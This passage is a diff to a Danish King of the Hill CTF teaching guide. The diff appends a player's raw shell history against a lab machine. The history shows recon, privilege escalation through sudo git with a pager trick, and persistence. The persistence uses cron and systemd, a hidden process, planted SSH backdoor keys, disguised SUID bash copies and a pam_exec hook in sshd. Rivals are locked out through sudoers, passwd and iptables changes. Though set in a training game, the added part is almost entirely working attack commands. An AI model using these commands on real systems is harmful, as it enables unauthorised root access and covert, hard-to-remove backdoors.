@@ -119,3 +119,67 @@ Efter runden skal du kunne besvare tre spørgsmål:
 **Målet er ikke kun at vinde. Målet er at forstå et angreb så godt, at du også kan forhindre det.**
 
 *Kilder: [TryHackMe KoTH](https://tryhackme.com/games/koth) · [KoTH-regler](https://help.tryhackme.com/en/articles/6498315-king-of-the-hill-overview) · [Maskinnoter](https://github.com/andracs/koth-vejledning) · [MITRE ATT&CK](https://attack.mitre.org/)*
+
+# En venlig KOTH spillers history fra undervisningen
+map -Pn -T4 --top-ports 1000 -sV 10.10.47.66 -oN nmap.txt
+ftp 10.10.47.66
+smbclient -N -L //10.10.47.66
+chmod 600 id_rsa
+ssh -i id_rsa ashu@10.10.47.66
+sudo -l
+nc 10.10.47.66 9001
+cat /home/skidy/homework/server1.py
+D=$(mktemp -d)
+cd $D
+git init -q .
+git config user.email x@x
+git config user.name x
+echo x>f
+git add f
+git commit -qm x
+script -qec "sudo -n git -C $D -c core.pager=/tmp/.systemd-pager log" /dev/null
+/tmp/.systemd-bash -p
+cat /usr/bin/chattr
+echo -n confick3r >| /root/king.txt
+mount --bind /root/king.txt /root/king.txt
+mount -o remount,ro,bind /root/king.txt
+nohup bash /tmp/.systemd-king confick3r &
+echo '* * * * * root bash /tmp/.systemd-king confick3r' >> /etc/crontab
+mount --bind /tmp /proc/1471
+systemctl enable --now systemd-kingd
+for f in /home/ashu/king.txt /home/skidy/king.txt /opt/king.txt /var/tmp/king.txt /usr/local/share/king.txt /root/king.txt.bak /home/ashu/.king /var/www/html/king.txt; do echo confick3r > $f; done
+ssh-keygen -t ed25519 -f backdoor -N ''
+cat backdoor.pub >> /root/.ssh/authorized_keys
+cat backdoor.pub >> /home/ashu/.ssh/authorized_keys
+for p in /usr/local/sbin/.debug-shell /var/tmp/.sys-cache/bash /home/ashu/.cache/.bash; do cp /bin/bash $p; chmod 4755 $p; done
+echo 'auth optional pam_exec.so quiet /usr/local/sbin/.cache-update' >> /etc/pam.d/sshd
+cat /home/ashu/flag.txt
+cat /home/skidy/flag.txt
+cat /var/ftp/flag.txt
+cat /home/ashu/mail-server-backup/support-room-help.txt
+grep -rl 'flag' /home /opt /root
+cat /home/skidy/homework/server2.py
+sed -i 's/^anonymous_enable=YES/anonymous_enable=NO/' /etc/vsftpd.conf
+service vsftpd restart
+sed -i 's/map to guest = Bad User/map to guest = Never/' /etc/samba/smb.conf
+sed -i 's/guest ok = yes/guest ok = no/I' /etc/samba/smb.conf
+service smbd restart
+mount --bind /etc/vsftpd.conf /etc/vsftpd.conf
+mount -o remount,ro,bind /etc/vsftpd.conf
+mount --bind /etc/samba/smb.conf /etc/samba/smb.conf
+mount -o remount,ro,bind /etc/samba/smb.conf
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG02wiH19VxRcBzUG3EQHZyB//Zwbi0rabO2ylANNIp7 kali@kali' > /root/.ssh/authorized_keys
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG02wiH19VxRcBzUG3EQHZyB//Zwbi0rabO2ylANNIp7 kali@kali' > /home/ashu/.ssh/authorized_keys
+sed -i 's|/bin/su skidy|/bin/su-DISABLED skidy|' /etc/sudoers
+sed -i 's|/usr/bin/git|/usr/bin/git-BLOCKED|g' /etc/sudoers
+visudo -c
+usermod -p '*' root
+sed -i 's/yourmom!/Xk92mQp77wLd/g' /home/skidy/homework/server1.py
+pkill -f server1.py
+mount --bind /home/skidy/homework/server1.py /home/skidy/homework/server1.py
+mount -o remount,ro,bind /home/skidy/homework/server1.py
+iptables -A INPUT -p tcp --dport 9002 -s 192.168.129.141 -j ACCEPT
+iptables -A INPUT -p tcp --dport 9002 -j DROP
+awk -F: '$3==0' /etc/passwd
+head -1 /root/king.txt
+
